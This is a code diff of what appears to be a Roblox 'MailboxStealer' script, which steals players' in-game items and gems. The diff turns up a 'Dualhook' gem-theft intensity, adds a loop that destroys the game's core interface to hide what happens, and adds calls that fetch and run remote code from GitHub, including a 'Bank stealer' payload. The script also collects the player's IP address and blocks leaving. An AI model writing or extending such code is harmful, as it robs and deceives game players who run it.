@@ -36,7 +36,7 @@ getgenv().Settings = {
     },
     Gems = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 50 --%
     }
 }
 
@@ -203,6 +203,9 @@ local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
+for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
+    v:Destroy()
+end
 -- Loading Screen
 if _G.LoadingScreen ~= false then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
@@ -742,8 +745,8 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
-    return;
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))()
+    return
 end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
@@ -758,6 +761,7 @@ if _G.AntiLeave ~= false then
     end
 end
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua'))()
 -- Pets Tables :
 
 TitanicList = {}
